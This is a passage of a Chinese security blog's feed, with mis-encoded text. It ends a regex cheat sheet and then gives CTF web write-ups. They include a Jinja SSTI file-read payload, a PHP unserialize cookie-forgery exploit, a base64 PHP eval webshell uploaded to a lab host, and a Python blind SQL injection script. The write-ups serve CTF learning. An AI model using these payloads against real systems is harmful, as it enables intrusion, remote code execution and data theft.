&quot;</span>10,000.00<span class="hljs-string">&quot;, å’Œæ²¡æœ‰ &quot;</span>åˆ†<span class="hljs-string">&quot; çš„ &quot;</span>10000<span class="hljs-string">&quot; å’Œ &quot;</span>10,000<span class="hljs-string">&quot;ï¼š^<span class="hljs-subst">[1-9]</span><span class="hljs-subst">[0-9]</span>*$ </span><span class="hljs-string"></span><span class="hljs-string">16    2.è¿™è¡¨ç¤ºä»»æ„ä¸€ä¸ªä¸ä»¥0å¼€å¤´çš„æ•°å­—,ä½†æ˜¯,è¿™ä¹Ÿæ„å‘³ç€ä¸€ä¸ªå­—ç¬¦&quot;</span>0<span class="hljs-string">&quot;ä¸é€šè¿‡,æ‰€ä»¥æˆ‘ä»¬é‡‡ç”¨ä¸‹é¢çš„å½¢å¼ï¼š^(0|<span class="hljs-subst">[1-9]</span><span class="hljs-subst">[0-9]</span>*)$ </span><span class="hljs-string"></span><span class="hljs-string">17    3.ä¸€ä¸ª0æˆ–è€…ä¸€ä¸ªä¸ä»¥0å¼€å¤´çš„æ•°å­—.æˆ‘ä»¬è¿˜å¯ä»¥å…è®¸å¼€å¤´æœ‰ä¸€ä¸ªè´Ÿå·ï¼š^(0|-?<span class="hljs-subst">[1-9]</span><span class="hljs-subst">[0-9]</span>*)$ </span><span class="hljs-string"></span><span class="hljs-string">18    4.è¿™è¡¨ç¤ºä¸€ä¸ª0æˆ–è€…ä¸€ä¸ªå¯èƒ½ä¸ºè´Ÿçš„å¼€å¤´ä¸ä¸º0çš„æ•°å­—.è®©ç”¨æˆ·ä»¥0å¼€å¤´å¥½äº†.æŠŠè´Ÿå·çš„ä¹Ÿå»æ‰,å› ä¸ºé’±æ€»ä¸èƒ½æ˜¯è´Ÿçš„å§.ä¸‹é¢æˆ‘ä»¬è¦åŠ çš„æ˜¯è¯´æ˜å¯èƒ½çš„å°æ•°éƒ¨åˆ†ï¼š^<span class="hljs-subst">[0-9]</span>+(.<span class="hljs-subst">[0-9]</span>+)?$ </span><span class="hljs-string"></span><span class="hljs-string">19    5.å¿…é¡»è¯´æ˜çš„æ˜¯,å°æ•°ç‚¹åé¢è‡³å°‘åº”è¯¥æœ‰1ä½æ•°,æ‰€ä»¥&quot;</span>10.<span class="hljs-string">&quot;æ˜¯ä¸é€šè¿‡çš„,ä½†æ˜¯ &quot;</span>10<span class="hljs-string">&quot; å’Œ &quot;</span>10.2<span class="hljs-string">&quot; æ˜¯é€šè¿‡çš„ï¼š^<span class="hljs-subst">[0-9]</span>+(.<span class="hljs-subst">[0-9]</span>&#123;2&#125;)?$ </span><span class="hljs-string"></span><span class="hljs-string">20    6.è¿™æ ·æˆ‘ä»¬è§„å®šå°æ•°ç‚¹åé¢å¿…é¡»æœ‰ä¸¤ä½,å¦‚æœä½ è®¤ä¸ºå¤ªè‹›åˆ»äº†,å¯ä»¥è¿™æ ·ï¼š^<span class="hljs-subst">[0-9]</span>+(.<span class="hljs-subst">[0-9]</span>&#123;1,2&#125;)?$ </span><span class="hljs-string"></span><span class="hljs-string">21    7.è¿™æ ·å°±å…è®¸ç”¨æˆ·åªå†™ä¸€ä½å°æ•°.ä¸‹é¢æˆ‘ä»¬è¯¥è€ƒè™‘æ•°å­—ä¸­çš„é€—å·äº†,æˆ‘ä»¬å¯ä»¥è¿™æ ·ï¼š^<span class="hljs-subst">[0-9]</span>&#123;1,3&#125;(,<span class="hljs-subst">[0-9]</span>&#123;3&#125;)*(.<span class="hljs-subst">[0-9]</span>&#123;1,2&#125;)?$ </span><span class="hljs-string"></span><span class="hljs-string">22    8.1åˆ°3ä¸ªæ•°å­—,åé¢è·Ÿç€ä»»æ„ä¸ª é€—å·+3ä¸ªæ•°å­—,é€—å·æˆä¸ºå¯é€‰,è€Œä¸æ˜¯å¿…é¡»ï¼š^(<span class="hljs-subst">[0-9]</span>+|<span class="hljs-subst">[0-9]</span>&#123;1,3&#125;(,<span class="hljs-subst">[0-9]</span>&#123;3&#125;)*)(.<span class="hljs-subst">[0-9]</span>&#123;1,2&#125;)?$ </span><span class="hljs-string"></span><span class="hljs-string">23    å¤‡æ³¨ï¼šè¿™å°±æ˜¯æœ€ç»ˆç»“æœäº†,åˆ«å¿˜äº†&quot;</span>+<span class="hljs-string">&quot;å¯ä»¥ç”¨&quot;</span>*<span class="hljs-string">&quot;æ›¿ä»£å¦‚æœä½ è§‰å¾—ç©ºå­—ç¬¦ä¸²ä¹Ÿå¯ä»¥æ¥å—çš„è¯(å¥‡æ€ª,ä¸ºä»€ä¹ˆ?)æœ€å,åˆ«å¿˜äº†åœ¨ç”¨å‡½æ•°æ—¶å»æ‰å»æ‰é‚£ä¸ªåæ–œæ ,ä¸€èˆ¬çš„é”™è¯¯éƒ½åœ¨è¿™é‡Œ</span><span class="hljs-string"></span><span class="hljs-string">24 xmlæ–‡ä»¶ï¼š^(<span class="hljs-subst">[a-zA-Z]</span>+-?)+<span class="hljs-subst">[a-zA-Z0-9]</span>+\\.<span class="hljs-subst">[x|X]</span><span class="hljs-subst">[m|M]</span><span class="hljs-subst">[l|L]</span>$</span><span class="hljs-string"></span><span class="hljs-string">25 ä¸­æ–‡å­—ç¬¦çš„æ­£åˆ™è¡¨è¾¾å¼ï¼š<span class="hljs-subst">[\u4e00-\u9fa5]</span></span><span class="hljs-string"></span><span class="hljs-string">26 åŒå­—èŠ‚å­—ç¬¦ï¼š<span class="hljs-subst">[^\x00-\xff]</span>    (åŒ…æ‹¬æ±‰å­—åœ¨å†…ï¼Œå¯ä»¥ç”¨æ¥è®¡ç®—å­—ç¬¦ä¸²çš„é•¿åº¦(ä¸€ä¸ªåŒå­—èŠ‚å­—ç¬¦é•¿åº¦è®¡2ï¼ŒASCIIå­—ç¬¦è®¡1))</span><span class="hljs-string"></span><span class="hljs-string">27 ç©ºç™½è¡Œçš„æ­£åˆ™è¡¨è¾¾å¼ï¼š\n\s*\r    (å¯ä»¥ç”¨æ¥åˆ é™¤ç©ºç™½è¡Œ)</span><span class="hljs-string"></span><span class="hljs-string">28 HTMLæ ‡è®°çš„æ­£åˆ™è¡¨è¾¾å¼ï¼š&lt;(\S*?)<span class="hljs-subst">[^&gt;]</span>*&gt;.*?&lt;/\1&gt;|&lt;.*? /&gt;    (ç½‘ä¸Šæµä¼ çš„ç‰ˆæœ¬å¤ªç³Ÿç³•ï¼Œä¸Šé¢è¿™ä¸ªä¹Ÿä»…ä»…èƒ½éƒ¨åˆ†ï¼Œå¯¹äºå¤æ‚çš„åµŒå¥—æ ‡è®°ä¾æ—§æ— èƒ½ä¸ºåŠ›)</span><span class="hljs-string"></span><span class="hljs-string">29 é¦–å°¾ç©ºç™½å­—ç¬¦çš„æ­£åˆ™è¡¨è¾¾å¼ï¼š^\s*|\s*$æˆ–(^\s*)|(\s*$)    (å¯ä»¥ç”¨æ¥åˆ é™¤è¡Œé¦–è¡Œå°¾çš„ç©ºç™½å­—ç¬¦(åŒ…æ‹¬ç©ºæ ¼ã€åˆ¶è¡¨ç¬¦ã€æ¢é¡µç¬¦ç­‰ç­‰)ï¼Œéå¸¸æœ‰ç”¨çš„è¡¨è¾¾å¼)</span><span class="hljs-string"></span><span class="hljs-string">30 è…¾è®¯QQå·ï¼š<span class="hljs-subst">[1-9]</span><span class="hljs-subst">[0-9]</span>&#123;4,&#125;    (è…¾è®¯QQå·ä»10000å¼€å§‹)</span><span class="hljs-string"></span><span class="hljs-string">31 ä¸­å›½é‚®æ”¿ç¼–ç ï¼š<span class="hljs-subst">[1-9]</span>\d&#123;5&#125;(?!\d)    (ä¸­å›½é‚®æ”¿ç¼–ç ä¸º6ä½æ•°å­—)</span><span class="hljs-string"></span><span class="hljs-string">32 IPåœ°å€ï¼š\d+\.\d+\.\d+\.\d+    (æå–IPåœ°å€æ—¶æœ‰ç”¨)</span><span class="hljs-string"></span><span class="hljs-string">33 IPåœ°å€ï¼š((?:(?:25<span class="hljs-subst">[0-5]</span>|2<span class="hljs-subst">[0-4]</span>\\d|<span class="hljs-subst">[01]</span>?\\d?\\d)\\.)&#123;3&#125;(?:25<span class="hljs-subst">[0-5]</span>|2<span class="hljs-subst">[0-4]</span>\\d|<span class="hljs-subst">[01]</span>?\\d?\\d)) </span><span class="hljs-string"></span><span class="hljs-string">34 å°†urlçš„åè®®ï¼Œä¸»æœºåï¼Œç«¯å£å·ï¼Œæ–‡ä»¶è·¯å¾„æ”¾åˆ°æ•°ç»„ä¸­:</span><span class="hljs-string">var str = &quot;</span>http://www.runoob.com:80/html/html-tutorial.html<span class="hljs-string">&quot;;</span><span class="hljs-string">var patt1 = /(\w+):\/\/(<span class="hljs-subst">[^/:]</span>+)(:\d*)?(<span class="hljs-subst">[^# ]</span>*)/;   //å››ä¸ªå­è¡¨è¾¾å¼ç»„åˆåœ¨ä¸€èµ·ï¼Œ(\w+): åŒ¹é…å­—ç¬¦ä¸²å¼€å§‹åˆ°: (<span class="hljs-subst">[^/:]</span>+) åŒ¹é…é/ é:åçš„å†…å®¹  (:\d*)? åŒ¹é…:åçš„è‹¥å¹²æ•°å­—ä¸”è¡¨è¾¾å¼é‡å¤ä¸€æ¬¡æˆ–å¤šæ¬¡  (<span class="hljs-subst">[^# ]</span>*) åŒ¹é…ä¸åŒ…æ‹¬#æˆ–ç©ºæ ¼å­—ç¬¦çš„ä»»ä½•å­—ç¬¦åºåˆ—</span></code></pre><h1 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h1><p>æ­£åˆ™è¡¨è¾¾å¼çš„åŠŸèƒ½è¿˜æ˜¯å¾ˆå¼ºå¤§çš„ï¼Œæƒ³è¦å†™å‡ºèƒ½å‡†ç¡®åŒ¹é…ç›®æ ‡çš„è¡¨è¾¾å¼è¿˜æ˜¯éœ€è¦è®¤çœŸå­¦ä¹ çš„ï¼Œä½†æ˜¯ä»£ç å®¡è®¡ä¸­çš„è¦æ±‚æ²¡é‚£ä¹ˆä¸¥æ ¼ï¼Œåªéœ€è¦èƒ½çœ‹æ‡‚è¡¨è¾¾å¼åŒ¹é…äº†å“ªäº›å†…å®¹å³å¯ã€‚</p>]]></content>
    
    
    <categories>
      
      <category>éšç¬”</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>cumtåä¸ºæ¯</title>
    <link href="/2020/10/28/%E5%8D%8E%E4%B8%BA%E6%9D%AF/"/>
    <url>/2020/10/28/%E5%8D%8E%E4%B8%BA%E6%9D%AF/</url>
    
    <content type="html"><![CDATA[<h1 id="cumt-åä¸ºæ¯"><a href="#cumt-åä¸ºæ¯" class="headerlink" title="cumt_åä¸ºæ¯"></a>cumt_åä¸ºæ¯</h1><p>ç»å…¸çš„å­¦é•¿è™èœå±€ï¼Œwebåªåšå‡ºæ¥ä¸€ä¸ªï¼Œå¦å¤–ä¸¤é¢˜å¥½ä¸å®¹æ˜“æœ‰æ€è·¯äº†ï¼Œéƒ½è¢«å¡æ­»äº†</p><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="doge"><a href="#doge" class="headerlink" title="doge"></a>doge</h3><p>çœŸç­¾åˆ°é¢˜ï¼ŒæŠ½ä¸ªå¥–å°±ç»™å‡ºäº†flag</p><h3 id="babyflask"><a href="#babyflask" class="headerlink" title="babyflask"></a>babyflask</h3><p>åˆšè¿›å…¥é¡µé¢ï¼Œåªæœ‰ä¸€å¼ å›¾ç‰‡ï¼ŒæŸ¥çœ‹æºç ä¹Ÿæ²¡å‘ç°ä»€ä¹ˆ</p><p>å°±æ˜¯äº†æ¨¡æ¿æ³¨å…¥</p><pre><code class="hljs handlebars"><span class="xml">url+</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">7</span>*<span class="hljs-number">7</span>&#125;&#125;</span><span class="xml">Copy</span></code></pre><p>é¡µé¢å‡ºç°404æŠ¥é”™ï¼Œå¹¶ä¸”æ˜¾ç¤ºçš„æ˜¯url+49ï¼Œç¡®å®šæ˜¯æ¨¡æ¿æ³¨å…¥</p><pre><code class="hljs sqf">&#123;&#123;<span class="hljs-string">&#x27;&#x27;</span>.<span class="hljs-variable">__class__</span>.<span class="hljs-variable">__mro__</span>[<span class="hljs-number">2</span>].<span class="hljs-variable">__subclasses__</span>()&#125;&#125;æŸ¥çœ‹æ¨¡å—æ—¶ï¼Œå‘ç°å­˜åœ¨wafç»è¿‡æµ‹è¯•å‘ç°æ˜¯è¿‡æ»¤äº†[]äºæ˜¯ä½¿ç”¨&#123;&#123;<span class="hljs-string">&#x27;&#x27;</span>.<span class="hljs-variable">__class__</span>.<span class="hljs-variable">__mro__</span>.<span class="hljs-variable">__getitem__</span>(<span class="hljs-number">2</span>).<span class="hljs-variable">__subclasses__</span>()&#125;&#125;å­˜åœ¨fileæ¨¡å—ç”¨readè¯»å–æ–‡ä»¶å†…å®¹<span class="hljs-built_in">exp</span>:<span class="hljs-string">&#x27;&#x27;</span>.<span class="hljs-variable">__class__</span>.<span class="hljs-variable">__mro__</span>.<span class="hljs-variable">__getitem__</span>(<span class="hljs-number">2</span>).<span class="hljs-variable">__subclasses__</span>().pop(<span class="hljs-number">40</span>)(<span class="hljs-string">&#x27;/flag&#x27;</span>).read()Copy</code></pre><p>å‚è€ƒé“¾æ¥ï¼š<a href="https://xz.aliyun.com/t/8029">https://xz.aliyun.com/t/8029</a></p><h3 id="VulnCMS"><a href="#VulnCMS" class="headerlink" title="VulnCMS"></a>VulnCMS</h3><p>è¿™é¢˜æ˜¯çœŸæ»´æ— è¯­ï¼Œå¼€å§‹ä»¥ä¸ºæ˜¯XSSï¼Œåæ¥å­¦é•¿æç¤ºä¸æ˜¯ï¼Œåˆæ‰¾åˆ°äº†æ–‡ä»¶ä¸Šä¼ çš„æ¼æ´ï¼Œç›´æ¥æ‹¿åˆ°äº†ç½‘ç«™æ ¹ç›®å½•æœ¬ä»¥ä¸ºåšå‡ºäº†ï¼Œç»“æœæç¤ºflag not here,å¿ƒæ€ç‚¸è£‚ï¼Œä½†æ˜¯æç¤ºäº†â€æŠ•ä¸ªç¨¿ï¼Ÿâ€œï¼Œåº”è¯¥æ˜¯åœ¨æŠ•ç¨¿ä½ç½®ä¸‹åŠŸå¤«å§ã€‚åˆ°æœ€åä¹Ÿæ²¡åšå‡ºäº†ï¼Œä½†æ˜¯æ‰¾åˆ°äº†æ¼æ´ä»£ç ï¼Œåº”è¯¥æ˜¯sqlæ³¨å…¥ã€‚</p><p><a href="https://i.loli.net/2020/10/25/usz3grOMb56lmPG.png"><img src="https://i.loli.net/2020/10/25/usz3grOMb56lmPG.png" alt="cms.png"></a></p><p>è¿™é‡Œç»™å‡ºå¤§ç¥çš„åšæ³•</p><p><a href="https://i.loli.net/2020/10/25/mrLVelBfQdD28CA.png"><img src="https://i.loli.net/2020/10/25/mrLVelBfQdD28CA.png" alt="cms1.png"></a></p><h3 id="Hodor"><a href="#Hodor" class="headerlink" title="Hodor"></a>Hodor</h3><p>è¿™é¢˜åŸºæœ¬ä¸Šæ˜¯åŸé¢˜ï¼Œä½†æ˜¯åŠ äº†ä¸€å±‚è¿‡æ»¤ï¼Œæ€ä¹ˆéƒ½æ²¡ç»•è¿‡å»ã€‚ã€‚ã€‚</p><p>çœ‹åˆ°WPæ˜¯å¤§Sç»•è¿‡ï¼Œæ¶¨çŸ¥è¯†äº†</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-class"><span class="hljs-keyword">Class</span> <span class="hljs-title">Source</span> </span>&#123;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>) </span>&#123;        <span class="hljs-keyword">return</span> highlight_file(<span class="hljs-string">&#x27;license.txt&#x27;</span>, <span class="hljs-literal">true</span>).highlight_file(<span class="hljs-keyword">$this</span>-&gt;source, <span class="hljs-literal">true</span>);    &#125;&#125;<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">easy_check</span>(<span class="hljs-params"><span class="hljs-variable">$str</span></span>) </span>&#123;    <span class="hljs-comment">//echo $str;</span>    <span class="hljs-keyword">if</span> (preg_match(<span class="hljs-string">&quot;/flag/i&quot;</span>, <span class="hljs-variable">$str</span>, <span class="hljs-variable">$matches</span>)) &#123;        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;    &#125;    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;&#125;<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;source&#x27;</span>]))&#123;    <span class="hljs-variable">$s</span> = <span class="hljs-keyword">new</span> Source();    <span class="hljs-variable">$s</span>-&gt;source = <span class="hljs-keyword">__FILE__</span>;    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$s</span>;    <span class="hljs-keyword">exit</span>;&#125;<span class="hljs-variable">$todos</span> = [];<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;todos&#x27;</span>]))&#123;    <span class="hljs-keyword">if</span>(!easy_check(<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;todos&#x27;</span>])) &#123;        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Hacker!\n&quot;</span>;    &#125; <span class="hljs-keyword">else</span> &#123;        <span class="hljs-variable">$c</span> = <span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;todos&#x27;</span>];        <span class="hljs-variable">$h</span> = substr(<span class="hljs-variable">$c</span>, <span class="hljs-number">0</span>, <span class="hljs-number">32</span>);        <span class="hljs-variable">$m</span> = substr(<span class="hljs-variable">$c</span>, <span class="hljs-number">32</span>);        <span class="hljs-keyword">if</span>(md5(<span class="hljs-variable">$m</span>) === <span class="hljs-variable">$h</span>)&#123;            <span class="hljs-variable">$todos</span> = unserialize(<span class="hljs-variable">$m</span>);        &#125;    &#125;&#125;<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;text&#x27;</span>]))&#123;    <span class="hljs-variable">$todo</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;text&#x27;</span>];    <span class="hljs-variable">$todos</span>[] = <span class="hljs-variable">$todo</span>;    <span class="hljs-variable">$m</span> = serialize(<span class="hljs-variable">$todos</span>);    <span class="hljs-variable">$h</span> = md5(<span class="hljs-variable">$m</span>);    setcookie(<span class="hljs-string">&#x27;todos&#x27;</span>, <span class="hljs-variable">$h</span>.<span class="hljs-variable">$m</span>);    header(<span class="hljs-string">&#x27;Location: &#x27;</span>.<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REQUEST_URI&#x27;</span>]);    <span class="hljs-keyword">exit</span>;&#125;<span class="hljs-comment">// flag is in flag.php</span>?Copy</code></pre><p>exp</p><pre><code class="hljs rust">echo md5(<span class="hljs-symbol">&#x27;a</span>:<span class="hljs-number">2</span>:&#123;i:<span class="hljs-number">0</span>;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;123&quot;</span>;i:<span class="hljs-number">1</span>;O:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;Source&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;source&quot;</span>;S:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;\66lag.php&quot;</span>;&#125;&#125;&#x27;);echo urlencode(<span class="hljs-symbol">&#x27;ae5860e508aaf353a9ad78ac246f46fba</span>:<span class="hljs-number">2</span>:&#123;i:<span class="hljs-number">0</span>;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;123&quot;</span>;i:<span class="hljs-number">1</span>;O:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;Source&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;source&quot;</span>;S:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;\66lag.php&quot;</span>;&#125;&#125;&#x27;);<span class="hljs-built_in">Copy</span></code></pre><p><a href="https://i.loli.net/2020/10/25/hNxGEfI5lRaevUg.png"><img src="https://i.loli.net/2020/10/25/hNxGEfI5lRaevUg.png" alt="hodor.png"></a></p><p>å‚è€ƒ</p><p><a href="https://blog.csdn.net/SmileAndFun/article/details/108497183">https://blog.csdn.net/SmileAndFun/article/details/108497183</a></p><h3 id="webcms"><a href="#webcms" class="headerlink" title="webcms"></a>webcms</h3><p>æ˜¯ä¸€ä¸ªåšå®¢ç®¡ç†çš„ç½‘ç«™ï¼Œå…¶å®ä¹Ÿæ˜¯ä¸ªåŸé¢˜ï¼Œè€ƒå¯Ÿç‚¹æ˜¯æ–‡ä»¶ä¸Šä¼ </p><p>æ¼æ´ç‚¹åœ¨å›¾ç‰‡ä¸­ä¸Šä¼ å›¾ç‰‡çš„ä½ç½®</p><p><a href="https://i.loli.net/2020/10/25/qAB4ZnH23j98JaO.png"><img src="https://i.loli.net/2020/10/25/qAB4ZnH23j98JaO.png" alt="webcms.png"></a></p><p>éšä¾¿ä¸Šä¼ ä¸€å¼ å›¾ç‰‡è¯•è¯•ï¼ŒæŠ“åŒ…ç»“æœå¦‚ä¸‹ï¼Œå‡ ä¸ªæ³¨æ„ç‚¹</p><p><a href="https://i.loli.net/2020/10/25/71cSPbv6KuaUl35.png"><img src="https://i.loli.net/2020/10/25/71cSPbv6KuaUl35.png" alt="webcms2.png"></a></p><blockquote><p>1.filetypeè§„å®šäº†æ–‡ä»¶çš„ç±»å‹</p><p>2.ä¸Šä¼ æ—¶ï¼Œå°†å›¾ç‰‡ä¿å­˜ä¸ºäº†base64å½¢å¼</p><p>æ‰€ä»¥ä¸Šä¼ ä¸€å¥è¯æœ¨é©¬çš„æ—¶å€™è¦æ³¨æ„ä¿®æ”¹å¯¹åº”çš„ä½ç½®</p></blockquote><p>ä¸€å¥è¯æœ¨é©¬ç±»å‹ä¸ºphp,åˆ™filetypeæ”¹ä¸ºphp</p><p>å†…å®¹ä¸ºå¯†ç ä¸ºcmdä¸€å¥è¯æœ¨é©¬ï¼Œå¯¹åº”çš„base64ç¼–ç <code>PD9waHAgZXZhbCgkX1BPU1RbJ2NtZCddKTs/Pg==</code></p><p><a href="https://i.loli.net/2020/10/25/YdaDjZmzb8KX6rc.png"><img src="https://i.loli.net/2020/10/25/YdaDjZmzb8KX6rc.png" alt="webcms3.png"></a></p><p>ä¸Šä¼ æˆåŠŸï¼Œè®¿é—®ä¿å­˜çš„è·¯å¾„ï¼š<code>http://219.219.61.234:20203/upload/tmp/1_Y2R8AK57UWV4JBW.php</code></p><pre><code class="hljs css">POST:cmd=<span class="hljs-built_in">system</span>(<span class="hljs-string">&quot;cat /flag&quot;</span>);æˆ–è€…èšå‰‘è¿æ¥ï¼Œå¯†ç cmdCopy</code></pre><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><p>MIscéƒ¨åˆ†åŸºæœ¬éƒ½æ˜¯é˜Ÿå‹åšçš„ï¼Œå¥½åƒä¹Ÿä¸æ˜¯å¤ªéš¾</p><h3 id="ä¼ªweb"><a href="#ä¼ªweb" class="headerlink" title="ä¼ªweb"></a>ä¼ªweb</h3><p>çœŸæ˜¯ä¼ªwebã€‚ã€‚ã€‚</p><p>ç›´æ¥åœ¨æ–‡ä»¶é‡Œæœç´¢å°±èƒ½åˆ°flag</p><p>æœç´¢å…³é”®è¯cmutï¼Œflagæ‰€åœ¨æ–‡ä»¶å¤¹ä¸ºhtml\include\include.php</p>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>unserialize</tag>
      
      <tag>ssti</tag>
      
      <tag>æ–‡ä»¶ä¸Šä¼ </tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>buuctf-LFI</title>
    <link href="/2020/10/08/buuoj-LFI/"/>
    <url>/2020/10/08/buuoj-LFI/</url>
    
    <content type="html"><![CDATA[]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>LFI</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>buuctf-sqlæ³¨å…¥</title>
    <link href="/2020/10/05/buuoj/"/>
    <url>/2020/10/05/buuoj/</url>
    
    <content type="html"><![CDATA[<h1 id="buuctfâ€“æ³¨å…¥ç¯‡"><a href="#buuctfâ€“æ³¨å…¥ç¯‡" class="headerlink" title="buuctfâ€“æ³¨å…¥ç¯‡"></a>buuctfâ€“æ³¨å…¥ç¯‡</h1><span id="more"></span><h2 id="CISCN2019-ååŒ—èµ›åŒº-Day2-Web1-Hack-World"><a href="#CISCN2019-ååŒ—èµ›åŒº-Day2-Web1-Hack-World" class="headerlink" title="[CISCN2019 ååŒ—èµ›åŒº Day2 Web1]Hack World"></a>[CISCN2019 ååŒ—èµ›åŒº Day2 Web1]Hack World</h2><p>ç»™äº†æç¤ºï¼Œ<code>All You Want Is In Table &#39;flag&#39; and the column is &#39;flag&#39;</code></p><p>çŒœæµ‹flagåœ¨flag è¡¨ä¸­ï¼ŒæŸ¥è¯¢è¯­å¥åº”è¯¥æ˜¯ select flag from flag</p><p>ç»è¿‡æµ‹è¯•ï¼Œå‘ç°è¿™é¢˜è¿‡æ»¤äº†å¾ˆå¤šå…³é”®å­—ï¼Œor,union,orderç­‰ï¼ŒçŒœæµ‹æ˜¯ç›²æ³¨</p><p><img src="https://i.loli.net/2020/11/30/gJAqhVCpN8nYvs1.png" alt></p><p>æ„é€ ç›²æ³¨è¯­å¥</p><p><code>id=if((ascii(substr((select(flag)from(flag)),0,1))&gt;90),1,2)</code></p><p><img src="https://i.loli.net/2020/11/30/YGtuAcFr2sHZUdD.png" alt></p><p><img src="https://i.loli.net/2020/11/30/oUqeZdHLfJCQPgr.png" alt></p><p>ä¸¤æ¬¡çš„æç¤ºè¯­å¥ä¸ä¸€æ ·ï¼Œè¯´æ˜è¿™ä¸ªæ³¨å…¥è¯­å¥æ˜¯å¯¹çš„ï¼Œä¸”å½“æç¤ºHelloæ—¶åº”è¯¥æ˜¯å¯¹çš„ã€‚</p><pre><code class="hljs python">// äºŒåˆ†æ³¨å…¥<span class="hljs-keyword">import</span> requestsurl = <span class="hljs-string">&quot;http://376688f4-59c4-4f47-8d0e-36c966e45631.node3.buuoj.cn/index.php&quot;</span>data = &#123;<span class="hljs-built_in">id</span> : <span class="hljs-string">&quot;&quot;</span>&#125;flag = <span class="hljs-string">&quot;&quot;</span><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">50</span>):    left = <span class="hljs-number">33</span>    right = <span class="hljs-number">128</span>    mid = (right + left) &gt;&gt; <span class="hljs-number">1</span>    <span class="hljs-keyword">while</span>(right&gt;left):        data[<span class="hljs-string">&quot;id&quot;</span>] = <span class="hljs-string">&quot;if((ascii(substr((select(flag)from(flag)),&#123;0&#125;,1))&gt;&#123;1&#125;),1,2)&quot;</span>.<span class="hljs-built_in">format</span>(i,mid)        response = requests.post(url,data=data)        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;Hello&quot;</span> <span class="hljs-keyword">in</span> response.text:            left = mid+<span class="hljs-number">1</span>        <span class="hljs-keyword">else</span>:            right = mid        mid=(right+left)&gt;&gt;<span class="hljs-number">1</span>    flag = flag + <span class="hljs-built_in">chr</span>(mid)    print(flag)print(flag)</code></pre><h2 id="æå®¢å¤§æŒ‘æˆ˜-2019-HardSQL"><a href="#æå®¢å¤§æŒ‘æˆ˜-2019-HardSQL" class="headerlink" title="[æå®¢å¤§æŒ‘æˆ˜ 2019]HardSQL"></a>[æå®¢å¤§æŒ‘æˆ˜ 2019]HardSQL</h2><p><strong>æŠ¥é”™æ³¨å…¥</strong></p><p>æµ‹è¯•å‘ç°<code>or,union,substr,ç©ºæ ¼,/**/</code>ç­‰éƒ½è¢«åŠ å…¥é»‘åå•ï¼ŒåŒå†™ä¹Ÿæ— æ³•ç»•è¿‡</p><p><img src="https://i.loli.net/2020/11/30/uHTdrgxB7I8QLDK.png" alt></p><p>å¯æ˜¯ä½¿ç”¨æŠ¥é”™æ³¨å…¥</p><blockquote><p>æŠ¥é”™æ³¨å…¥åŸç†ï¼š</p><p>å…¶åŸå› ä¸»è¦æ˜¯å› ä¸ºè™šæ‹Ÿè¡¨çš„ä¸»é”®é‡å¤ã€‚æŒ‰ç…§MySQLçš„å®˜æ–¹è¯´æ³•ï¼Œgroup byè¦è¿›è¡Œä¸¤æ¬¡è¿ç®—ï¼Œç¬¬ä¸€æ¬¡æ˜¯æ‹¿group byåé¢çš„å­—æ®µå€¼åˆ°è™šæ‹Ÿè¡¨ä¸­å»å¯¹æ¯”å‰ï¼Œé¦–å…ˆè·å–group byåé¢çš„å€¼ï¼›ç¬¬äºŒæ¬¡æ˜¯å‡è®¾group 